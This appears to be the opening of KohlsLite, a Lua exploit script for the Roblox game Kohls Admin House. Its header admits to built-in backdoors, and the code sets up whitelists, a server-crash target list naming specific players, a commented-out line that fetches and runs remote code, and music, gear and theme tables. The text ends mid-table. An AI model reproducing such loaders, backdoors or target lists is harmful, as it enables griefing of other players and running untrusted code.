--[[
 ___  __    ________  ___  ___  ___       ________  ___       ___  _________  _______      
|\  \|\  \ |\   __  \|\  \|\  \|\  \     |\   ____\|\  \     |\  \|\___   ___\\  ___ \     
\ \  \/  /|\ \  \|\  \ \  \\\  \ \  \    \ \  \___|\ \  \    \ \  \|___ \  \_\ \   __/|    
 \ \   ___  \ \  \\\  \ \   __  \ \  \    \ \_____  \ \  \    \ \  \   \ \  \ \ \  \_|/__  
  \ \  \\ \  \ \  \\\  \ \  \ \  \ \  \____\|____|\  \ \  \____\ \  \   \ \  \ \ \  \_|\ \ 
   \ \__\\ \__\ \_______\ \__\ \__\ \_______\____\_\  \ \_______\ \__\   \ \__\ \ \_______\
    \|__| \|__|\|_______|\|__|\|__|\|_______|\_________\|_______|\|__|    \|__|  \|_______|
                                            \|_________|                                   
                                                                                           
                                                                                           v1.8 ]]

--[[
https://kohlslite.pages.dev/source.txt

This free, open-source script is for the Roblox game Kohls Admin House (KAH).
You can play KAH here: https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC-Updated
This script was created by ScriptingProgrammer (Roblox) / ts2021 (Discord) / S-PScripts (GitHub).

The longest Kohls Admin House script freely available. (SCV3-VAR and Kozy.Docx are longer than KL but paid and not public respectively)

This script was built from the ground up. KohlsLite is NOT a fork of any other scripts. 

KohlsLite is LIKE a mixture of all the scripts that already exist in KAH such as:
  -- > CMD (v1)
  -- > CMD Y
  -- > CMD v3
  -- > Shortcut v1
  -- > Shortcut v2
  -- > Shortcut v3
  -- > Shortcut v3 VAR [don't have the source]
  -- > PR Script
  -- > ii's Stupid Admin
  -- > KohlsNoob
  -- > KohlsCool (maybe?)
  -- > Noobsploit
  -- > Jotunnheim
  -- > Shazam
  -- > Route
  -- > SimpleKAH
  -- > XKah
  -- > Scripts from S-PScripts/kah-fork

Some of the code here is from other creators (and I credited) but quite a lot is my own and also some commands can't be changed code-wise that much.

This script has not been discontinued but is not frequently updated as of now (due to me having school).

There are no more watermarks in this script. This script does have back doors (dev section) due to idiots abusing like crazy using this script.

Support this script today by donating Robux to me on Roblox (especially since this script has limited advertising now).

Please do not edit this script by simply removing the dev section and then proceeding to abuse in KAH. It makes me annoyed!
You can make your own script instead and you can take stuff from here if necessary.

Please don't go abusing like crazy using this script. I made this free/open-source and don't want idiots doing stuff that forces me to make this paid/obfuscated.

I know this script is inconsistent with the fact it uses Game with and without GetService but I don't care.

]]

-- Notifications
local function Remind(msg)
        game.StarterGui:SetCore("SendNotification", {
                Title = "KohlsLite v1.8",
                Text = msg,
                Duration = 1
        })
end;

-- Check if KohlsLite is already executed
if getgenv().kohlsexecuted then 
        return 
        Remind("You've already executed KohlsLite!") 
end

-- Loader
if not game:IsLoaded() then
    local notLoaded = Instance.new("Message")
    notLoaded.Parent = game:GetService("CoreGui")
    notLoaded.Text = "KohlsLite is waiting for the game to load..."
    game.Loaded:Wait()
    notLoaded:Destroy()
end

-- Place checker
if game.PlaceId ~= 112420803 and game.PlaceId ~= 115670532  then 
	local response = Instance.new("BindableFunction")
	function response.OnInvoke(answer)
		if answer == "Yes" then
		    	game:GetService("TeleportService"):Teleport(112420803, game:GetService("Players").LocalPlayer) -- nbc only join, cry.
		end
	end
	game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "You are not in Kohls Admin House. Would you like to join KAH [NBC]?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
	})
	return
end

-- IY Auto Executor (Sorry if this is annoying but there's a bug in the lines for the prefix checker above which causes my script to break if IY is loaded after KL that I can't debug as of now
--loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

-- Don't touch this!
getgenv().kohlsexecuted = true

-- The prefix you are using for KohlsLite. This can be of any length.
getgenv().deprefix = "." 

-- The version of KohlsLite
getgenv().klversion = "1.8"

-- Chat function
local function Chat(msg)
      game.Players:Chat(msg)
end

-- Speak function
local function Speak(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

local prefix 

-- Prefix checker
if getgenv().theprefix then
	prefix = getgenv().theprefix
else
	prefix = getgenv().deprefix
end

-- Defaults (you can change these)
local defaults = {".antirocket me", ".tnok", ".antikill me"} --".antimsg me"

-- Misc variables (ignore these)
local bending -- ignore
local ratelj -- ignore
local eincrash -- ignore

local notifiedRespectFiltering = false

-- Perm spoofer (speed)
editedspeedis = 16
editedspeed = true

-- Perm spoofer (jumppower)
editedjumpis = 50
editedjump = true

-- Boombox range
bgrange = 128

-- Mobile checker
IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, game:GetService("UserInputService"):GetPlatform()) -- infinite yield duh

-- Auto rejoin
autorejoin = false

-- Stats when loading
Stats = {}
Stats.starttime = os.clock()

-- Start up scripts
local function startupScripts()
           if not getgenv().autoruncmds then
                for i = 1, #defaults do
                        Chat(defaults[i]) 
                end
        else
            for i = 1, #getgenv().autoruncmds do
                        Chat(getgenv().autoruncmds[i])
            end
        end
end

-- Serverlocked users
local blacklist = {
    "SlenderMan990921",
    "aliihsan12345Bloxy",
    "jhjssikeksms"
}

-- Users not affected by serverlock
local whitelist = {}

-- Perm Whitelist
local pwl = {

 -- yeah i know i should use user ids instead just wait for that update that will come out in 2030 --
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "BANNter_Original",
    "witnessfox22",
    "IceStuds",
    "atprog",
    "Di33le2",
    "darkmadeboy",
    "Dekryptionite",
    "Redstoneboy2008",
    "decryptionites",
    "3cxos",
    "ripcxo",
    "hudhejeir",
    "BIGpe7niss7",
    "clydekash",
    "t_echl",
    "Ih0temyIife",
    "D_ionte",
    "SZCVAK",
    "TheRealestOnHere",
    "Altsarecooleh",
    "idonthacklol101ns",
    "Me_ChurchOfSat4n",
    "Milderous",
    "Anka_707587",
    "DionteIsCute",
    "me_capybara",
    "E4_DQ",
    "vgcrash",
    "s_pisafurry",
    "YT_MATHEUSMODZ5", 
    "kevin3050ti",
    "grimAuxiliatrix",
    "ikbx",
    "undertaker629",
    "Eggkid7",
    "4g8h",
    "kohlslitedev",
    "Palamode",
    "whatveidone",
    "yeyeyeweweweye",
    "siga5167",
    "3akakauuky"
}

-- Players you cannot kick
local nokick = {
  "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "BANNter_Original",
    "witnessfox22",
    "IceStuds",
    "atprog",
    "Di33le2",
    "darkmadeboy",
    "Dekryptionite",
    "Redstoneboy2008",
    "decryptionites",
    "3cxos",
    "ripcxo",
    "hudhejeir",
    "BIGpe7niss7",
    "clydekash",
    "t_echl",
    "Ih0temyIife",
    "D_ionte",
    "SZCVAK",
    "TheRealestOnHere",
    "Altsarecooleh",
    "idonthacklol101ns",
    "Me_ChurchOfSat4n",
    "Milderous",
    "Anka_707587",
    "DionteIsCute",
    "me_capybara",
    "E4_DQ",
    "vgcrash",
    "s_pisafurry",
    "YT_MATHEUSMODZ5", 
    "kevin3050ti",
    "grimAuxiliatrix",
    "ikbx",
    "undertaker629",
    "Eggkid7",
    "4g8h",
    "kohlslitedev",
    "Palamode",
    "whatveidone",
    "yeyeyeweweweye",
    "siga5167",
    "3akakauuky"
}

-- Users that can use blacklisted gears (or gears when antigear is on)
local GWhitelisted = {}

-- Perm Gear Whitelist
local pgwl = {
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "BANNter_Original",
    "witnessfox22",
    "IceStuds",
    "atprog",
    "Di33le2",
    "darkmadeboy",
    "Dekryptionite",
    "Redstoneboy2008",
    "decryptionites",
    "3cxos",
    "ripcxo",
    "hudhejeir",
    "BIGpe7niss7",
    "clydekash",
    "t_echl",
    "Ih0temyIife",
    "D_ionte",
    "SZCVAK",
    "TheRealestOnHere",
    "Altsarecooleh",
    "idonthacklol101ns",
    "Me_ChurchOfSat4n",
    "Milderous",
    "Anka_707587",
    "DionteIsCute",
    "me_capybara",
    "E4_DQ",
    "vgcrash",
    "s_pisafurry",
    "YT_MATHEUSMODZ5", 
    "kevin3050ti",
    "grimAuxiliatrix",
    "ikbx",
    "undertaker629",
    "Eggkid7",
    "4g8h",
    "kohlslitedev",
    "Palamode",
    "whatveidone",
    "yeyeyeweweweye",
    "siga5167",
    "3akakauuky"
}

-- Developers of KL
local specialperms = {
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "atprog",
    "IceStuds",
    "s_pisafurry",
    "kohlslitedev",
    "yeyeyeweweweye"
}

-- atprog spexialpermz (Perms for non-developers)
local atprogperms = {
    "atprog",
    "IceStuds",
    "decryptionites",
    "minecraftgamer2012YT",
    "clydekash",
    "ripcxo",
    "grimAuxiliatrix",
    "undertaker629",
    "jjjuuikjjikkju",
    "FR6DDIIE",
    "D_ionte"
}

-- New users get blacklisted (prevent crashers)
local newplrslocked = {} -- don't edit!!
local newplrautoslock = true -- if new players under 21 days join they get blacklisted
local newlen = 21 -- control what is considered as a new account

-- Serverlock
local slockenabled = false

-- auto char
autocharid = "nll"
autochar = false

-- watermark
watermark_kl = false
-- watermarK_text = "KohlsLite" (unused)

-- Other stuff
local loopkill = {}
local byecam = {}
local carcar = {}

-- anti kill list i didn't make it for any other antis so cryyy!
antikill = {}

-- Gamepass saving
permusers = {} -- users that use perm will be placed here
personsusers = {} -- users that use persons will be placed here

-- Auto stuff upon user joining

-- Rocket kick player
rkick_on_sight = {} 

-- Crash server
crash_on_sight = {"jhjssikeksms","aliihsan12345Bloxy"}

-- Message kick
mkick_on_sight = {} 

-- Hat kick
hatkick_on_sight = {}

-- Slow user
suser_on_sight = {}

-- Furry user
furry_on_sight = {} -- 9jn

-- Gearban user
gb_on_sight = {}

-- Variables for moving
local movestatus = false
Kohls = workspace.Terrain:WaitForChild("_Game")
Admin = Kohls:WaitForChild("Admin")
Pads = Admin:WaitForChild("Pads"):GetChildren()

local musicplay

-- These are all of the music ids I've saved
-- Thanks to Dizzy for this idea of writing my musiclist
-- PLEASE NOTE THAT "GMUSIC1" ETC. IS INTENTIONAL. THE MISSING SPACE BETWEEN GMUSIC AND 1 IS INTENTIONAL.
-- exfamous stole this grrr


local musictable = {
    ["1"] = { id = "9048375035", name = "All dropping 8 beats" },
    ["2"] = { id = "1839029458", name = "Exotico Speedo" },
    ["3"] = { id = "35930009", name = "Monster Mash" },
    ["4"] = { id = "11808880515", name = "women song" },
    ["5"] = { id = "1841647093", name = "Life in an Elevator" },
    ["6"] = { id = "1837070127", name = "Prima Bossa" },
    ["7"] = { id = "2042581436", name = "annoying citizen" },
    ["8"] = { id = "5216738441", name = "big obama the real g" },
    ["9"] = { id = "9038620433", name = "Out Of My Head" },
    ["10"] = { id = "8147012902", name = "gigachad loop" },
    ["11"] = { id = "9124780123", name = "Miss the rage Loop (Sparo Loop)" },
    ["12"] = { id = "142376088", name = "Raining Tacos" },
    ["13"] = { id = "1846368080", name = "Stadium Rave (A)" },
    ["14"] = { id = "1840511219", name = "Funky Fanfare" },
    ["15"] = { id = "1839404854", name = "Rock In" },
    ["16"] = { id = "1838097718", name = "Royal Dedication" },
    ["17"] = { id = "9038845849", name = "dubstep" },
    ["18"] = { id = "1843622301", name = "Mumbai Moon" },
    ["19"] = { id = "14145620056", name = "The Final Phonk" },
    ["20"] = { id = "13530437708", name = "Phonk Vol 2 - The Final Phonk" },
    ["21"] = { id = "14145627857", name = "Catch My Drift" },
    ["22"] = { id = "14145624031", name = "Phonk Vol. 1" },
    ["23"] = { id = "13530438299", name = "stop posting about baller" },
    ["24"] = { id = "1838028467", name = "VIP Me" },
    ["25"] = { id = "1848354536", name = "James Clarke - Relaxed Scene" }, -- chill back (alt name before i found the actual original music)
    ["26"] = { id = "45819151", name = "sad depressing music 4am" },
    ["27"] = { id = "5410084188", name = "WRLD - Hang Up" },
    ["28"] = { id = "7612400047", name = "SEGAAA" },
    ["29"] = { id = "16190783444", name = "Dubidubidu (Techno Remix)" }, -- chipi chipi chapa chapa (alt name before i found clipply)
    ["30"] = { id = "16190782786", name = "Lil Kuudere X sukoyomi" },
    ["31"] = { id = "15689455422", name = "kirkiimad - i love (slow+reverb version)" },
    ["32"] = { id = "1841668624", name = "Have a Lazy Day a" },
    ["33"] = { id = "1848350335", name = "Desert Sands" },
    ["34"] = { id = "1837853076", name = "SEE YOU IN HELL!" },
    ["35"] = { id = "5410085763", name = "TOKYO MACHINE - PLAY!"},
    ["36"] = { id = "1838635121", name = "Sad End"},
    ["37"] = { id = "1839817591", name = "Animation Opening"},
    ["38"] = { id = "1837879082", name = "Paradise Falls"},
    ["39"] = { id = "1837392641", name = "Cannibal Collection"},
    ["40"] = { id = "16662831858", name = "WahRA - Idk Remix"},
    ["41"] = { id = "7764369437", name = "BEEP"},
    ["42"] = { id = "1845458027", name = "Smooth Nylons"},
    ["43"] = { id = "9047105533", name = "No Smoking"},
    ["44"] = { id = "1846808350", name = "Get Up And Boogie"},
    ["45"] = { id = "14366981962", name = "Diss na Hagi Łagi"},
    ["46"] = { id = "11265157079", name = "Advance Slayer"},
    ["47"] = { id = "11265140685", name = "Untitled"},
    ["48"] = { id = "11265166921", name = "Pierniki"},
    ["49"] = { id = "11265137944", name = "Slayers Hatred"},
    ["50"] = { id = "11265148479", name = "Amogus"},
    ["51"] = { id = "11265145737", name = "Blaze You"},
    ["52"] = { id = "11265173310", name = "Biszkopty"},
    ["53"] = { id = "11265164947", name = "Chipsy"},
    ["54"] = { id = "11496561844", name = "Fresh New Age"},
    ["55"] = { id = "14884822656", name = "CyPhrix - StartUpSequence.cprx"},
    ["56"] = { id = "14884819670", name = "CyPhrix - Wobble"},
    ["57"] = { id = "14884823796", name = "XRAY"},
    ["58"] = { id = "14884823178", name = "Three Dimensions"},
    ["59"] = { id = "14884817162", name = "Angel Hour"},
    ["60"] = { id = "14884823527", name = "Outcome"},
    ["61"] = { id = "14366982317", name = "GTA"},
    ["62"] = { id = "15689442195", name = "CEO"},
    ["63"] = { id = "15689441772", name = "HELLFIRE" },
    ["64"] = { id = "15689451512", name = "Nothing Bad Is Going to Happen" },
    ["65"] = { id = "15689446882", name = "EXISTANCE"},
    ["66"] = { id = "16190782511", name = "uzipack"},
    ["67"] = { id = "9043887091", name = "Lo-fi Chill A"},
    ["68"] = { id = "1837768517", name = "Bossa Me (a)"},
    ["69"] = { id = "9039445224", name = "8 Bitty Kitty - Underscore"},
    ["70"] = { id = "9046863579", name = "City Lights - Roblox"},
    ["71"] = { id = "15689457918", name = "nMisaki - Dream Girl (sped up)"},
    ["72"] = { id = "1845742414", name = "Appetizer"},
    ["73"] = { id = "7029024726", name = "Throttle - Bloom"},
    ["74"] = { id = "1840612595", name = "A New Renaissance"},  
    ["75"] = { id = "1836054144", name = "Upbeat Dude"},
    ["76"] = { id = "1837275138", name = "Never Enough"},
    ["77"] = { id = "1839917800", name = "Unknown"},
    ["78"] = { id = "1840221593", name = "Fit For Life (A)"},
    ["79"] = { id = "9041863801", name = "Unknown"},
    ["80"] = { id = "1836711447", name = "Just Like Me"},
    ["81"] = { id = "1845070869", name = "Eye Open"},
    ["82"] = { id = "1847863129", name = "Tech Synth A"},
    ["83"] = { id = "1845073388", name = "Need For Speed"},
    ["84"] = { id = "1845092143", name = "Super Nova"},
    ["85"] = { id = "1840006904", name = "Tricky (a)"},
    ["86"] = { id = "2665943889", name = "get jebaited"},
    ["87"] = { id = "18841891575", name = "d3r, m1v, asteria - no escape"}
}

-- Saved gears
local gearlist = {
    ["boombox"] = { gearid = "212641536" },
    ["vg"] = { gearid = "94794847" },
    ["osas"] = { gearid = "92628079" },
    ["gb"] = { gearid = "82357101" },
    ["bhbomb"] = { gearid = "28277486" },
    ["tictac"] = { gearid = "16924676" },
    ["pgun"] = { gearid = "34870758" },
    ["camfixer"] = { gearid = "79736563" },
    ["painter"] = { gearid = "18474459" },
    ["telemon"] = { gearid = "93136746" },
    ["trapmine"] = { gearid = "11999247" },
    ["timegears"] = { gearid = "77443461" },
    ["admslayer"] = { gearid = { "268586231", "1103011681"} },
    ["kp"] = { gearid = {"583030187, 68539623"} },
    ["icebreaker"] = { gearid = {"87361662", "66896601"} },
    ["periastrons"] = { gearid = {"108158379", "80661504", "233520257", "73829193", "69499437", "139577901", "2544549379", "120307951", "99119240", "93136802", "80597060", "159229806", "77443461"} },
    ["melees"] = { gearid = {"121946387", "12187348", "170897263", "427947884", "306971294", "306971294", "11999235", "28275809", "10758456", "243790334", "14719505", "13207169", "11956382", "10469910", "124472052", "20721924"} },
    ["guns"] = { gearid = {"243007180", "116693764", "212296936", "168143042", "467138029", "42845609", "130113146", "26017478", "26014536", "9360722592", "18268645"} },
    ["fungears"] = { gearid = {"111876831", "90718686", "283755431", "139578061", "90718686", "212641536", "392057539", "323477973", "78730532", "47597835", "212641536", "88143093", "73265108", "115377964", "98411393" } },
    ["explosives"] = { gearid = {"88885539", "88885524", "73888479", "110337853", "101110605", "29957963", "503955938", "243788010", "88146497"} },
    ["destructives"] = { gearid = {"125013830", "225921650", "60357972", "108158379"} },
    ["swords"] = { gearid = {"25740034", "638089422", "170903610", "319655422", "125013769", "108158379", "2470750640", "2041982658", "361950297", "2103274863", "181356054", "163491866", "108158439"} },
    ["rideables"] = { gearid = {"304719869", "2568114215", "158069143", "185422295", "346687565", "553939167", "820013867", "387285940", "163348575", "206799274", "928805891", "124127383", "125013849", "2445089071", "253519495"} }
}

-- Saved turns
local turnlist = {
    ["furry"] = 
	{name = {
		"char [args2] 18", 
		"paint [args2] Institutional white", 
		"hat [args2] 10563319994", 
		"hat [args2] 12578728695", 
		"shirt [args2] 10571467676", 
		"pants [args2] 10571468508"
		}
	},
    ["female"] = 
	{name = {
		"char [args2] 31342830", 
		"removehats [args2]", 
		"paint [args2] Institutional white", 
		"hat [args2] 7141674388", 
		"hat [args2] 7033871971", 
		"shirt [args2] 5933990311", 
		"pants [args2] 7219538593"
		}
	},
    ["cop"] = 
	{name = {
		"unhat [args2]", 
		"shirt [args2] 3759924160", 
		"hat [args2] 7310970599", 
		"face [args2] 86487700", 
		"pants [args2] 6214369602"
		}
	},
    ["hacker"] = 
	{name = {
		"unhat [args2]", 
		"hat [args2] 4995698441", 
		"shirt [args2] 4800661980", 
		"pants [args2] 3149138619", 
		"hat [args2] 4995698441", 
		"trail [args2] green", 
		"paint [args2] black"
		}
	},
    ["thief"] = 
	{name = {
		"unhat [args2]", 
		"trail [args2] black", 
		"paint [args2] black", 
		"hat [args2] 20642008", 
		"hat [args2] 4855031321", 
		"hat [args2] 4904891637", 
		"shirt [args2] 4656776376", 
		"pants [args2] 129459077", 
		"hat [args2] 4531231804"
		}
	}

}

-- Arg changer for turn
local function replaceArgs2(name, args2)
    return string.gsub(name, "%[args2%]", args2)
end

-- Saved chars
local charlist = {
    ["furry"] = { charid = "4844006008" }, -- 1
    ["sierr"] = { charid = "1267527674" }, -- 2
    ["telac"] = { charid = "13645" },           -- 3
    ["epicszs"] = { charid = "548456077" },  -- 4
    ["temi"] = { charid = "45024180" },   -- 5
    ["atprog"] = { charid = "1389780396" }, -- 6
    ["menaal"] = { charid = "1793973864" }, -- 7
    ["agspureiam"] = { charid = "36377783" },   -- 8
    ["tech"] = { charid = "1702851506" }, -- 9
    ["aria"] = { charid = "2781438808" }, -- 10
    ["mel"] = { charid = "619659263" }, -- 11
    ["noob"] = { charid = "18" }, -- 12
    ["bacon"] = { charid = "2568447690" } -- 13
}

-- Themes
local themecode = {
    ["1"] = {name = "dark blue", code = "time 4,outdoorambient 000 000 11"},
    ["2"] = {name = "old trip", code = "fogend 100,fogcolor 250 0 500"},
    ["3"] = {name = "shanty night", code = "time 19,outdoorambient 250 100 250"},
    ["4"] = {name = "purple glaze", code = "time -,fogend 600,fogcolor 300 0 800"},
    ["5"] = {name = "yellow mist", code = "time -,fogend 25,fogcolor 255 255 51"},
    ["6"] = {name = "dark depths", code = "time 0,fogcolor 0 0 0,fogend 25"},
    ["7"] = {name = "nice sky", code = "fogend 75,fogcolor 0 155 255"},
    ["8"] = {name = "bright pink", code = "time -,fogend 46,fogcolor 250 83 255"},
    ["9"] = {name = "acid proximity", code = "time -,fogend 1000,fogcolor 37 355 55"},
    ["10"] = {name = "sapphire evening", code = "fogcolor 100 0 255,fogend 1000,time 6,outdoorambient 0 0 0,brightness 0.5,ambient 125 0 255"},
    ["11"] = {name = "sunrise rtx", code = "fix,time 7,fogend 2000,outdoorambient 0.3 0.3 0.3"},
    ["12"] = {name = "sunrise", code = "fix,time 7.15,colorshifttop 600 400 0,colorshiftbottom 600 400 0"},
    ["13"] = {name = "true black", code = "time 0,fogcolor 0 0 0,fogend 0"},
    ["14"] = {name = "sunset", code = "fix,time 17.4,colorshifttop 600 400 0,colorshiftbottom 600 400 0"},
    ["15"] = {name = "ice", code = "fix,time 17.4,fogcolor -100 -400 -600,fogend 500,colorshifttop 0 255 255,colorshiftbottom 0 255 255"},
    ["16"] = {name = "blood", code = "fix,fogcolor 255 0 0,fogend 150,ambient 255 0 0,colorshifttop 255 0 0,colorshiftbottom 255 0 0"},
    ["17"] = {name = "aesthetic", code = "fix,time 15,fogend 500,fogcolor -400 -191 -139,outdoorambient 191 143 95,colorshifttop 255 191 139"},
    ["18"] = {name = "heaven", code = "fix,time 14,fogend 200,fogcolor -300 -300 -300,outdoorambient -400 -400 -400,ambient -400 -400 -400"},
    ["19"] = {name = "hell", code = "fix,time 0,outdoorambient -600 0 0,ambient -600 0 0,fogcolor -600 0 0,fogend 500,colorshiftbottom -600 0 0,colorshifttop -600 0 0,brightness 2"},
    ["20"] = {name = "shadowy town", code = "fix,fogend 70,fogcolor 0 0 0,brightness 0"},
    ["21"] = {name = "noir swamp", code = "fix,time 100,outdoorambient 0 0 099,brightness 0"},
    ["22"] = {name = "snow", code = "fix,time 17.4,colorshifttop 255 255 255,colorshiftbottom 255 255 255"},
    ["23"] = {name = "blue sky", code = "ambient 0 0 256,colorshifttop 0 0 256,fogcolor 0 0 256,fogend 50"}
}

-- Parts
local ogcframes = {
                ["SmoothBlockModel178"] = {-13.0650005, 45.4300003, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel176"] = {-15.0650005, 37.6300011, 51.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel140"] = {-13.0650005, 37.0300026, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel137"] = {-19.0650005, 31.0300007, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel135"] = {-11.0650005, 36.4300003, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel131"] = {-15.0650005, 37.6300011, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel129"] = {-17.0650005, 38.2300034, 54.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel124"] = {-30.0650005, 38.2300034, 48.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel123"] = {-9.06500053, 25.0300007, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel118"] = {-11.0650005, 36.4300003, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel117"] = {-3.06500006, 13.6300011, 63.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel116"] = {-3.06500006, 13.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel128"] = {-21.0650005, 32.2300034, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel110"] = {-25.0650005, 34.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel105"] = {-57.0650024, 13.6300011, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel125"] = {-17.0650005, 29.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel104"] = {-7.06500053, 23.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel119"] = {-30.0650005, 37.0300026, 54.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel100"] = {-5.06500006, 22.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel97"] = {-41.0650024, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel89"] = {-3.06500006, 15.4300003, 61.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel88"] = {-13.0650005, 27.4300022, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel147"] = {-57.0650024, 18.4300003, 73.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel160"] = {-15.0650005, 45.4300003, 51.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel84"] = {-35.0650024, 34.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel81"] = {-3.06500006, 5.23000002, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel80"] = {-57.0650024, 21.4300003, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel111"] = {-37.0650024, 33.4300003, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel87"] = {-15.0650005, 28.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel78"] = {-41.0650024, 31.0300007, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel77"] = {-39.0650024, 32.2300034, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel165"] = {-11.0650005, 45.4300003, 53.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel76"] = {-35.0650024, 34.6300011, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel75"] = {-30.0650005, 28.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel106"] = {-57.0650024, 15.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel74"] = {-39.0650024, 32.2300034, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel69"] = {-3.06500006, 13.6300011, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel67"] = {-16.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel98"] = {-30.0650005, 26.2300014, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel66"] = {-57.5650024, 7.03000021, 61.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel65"] = {-3.06500006, 13.6300011, 58.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel63"] = {-33.0650024, 35.8300018, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel62"] = {-33.0650024, 35.8300018, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel68"] = {-30.0650005, 31.0300007, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel109"] = {-30.0650005, 37.0300026, 66.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel162"] = {-17.0650005, 45.4300003, 55.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel61"] = {-35.0650024, 34.6300011, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel58"] = {-43.0650024, 29.8300018, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel57"] = {-3.06500006, 10.0300007, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel55"] = {-55.0650024, 22.6300011, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel108"] = {-3.06500006, 15.4300003, 72.3430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel48"] = {-57.0650024, 11.2300005, 50.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel102"] = {-3.06500006, 21.4300003, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel46"] = {-38.5650024, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel44"] = {-51.0650024, 25.0300007, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel43"] = {-22.5650005, 10.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel41"] = {-30.0650005, 21.4300003, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel39"] = {-57.0650024, 13.6300011, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
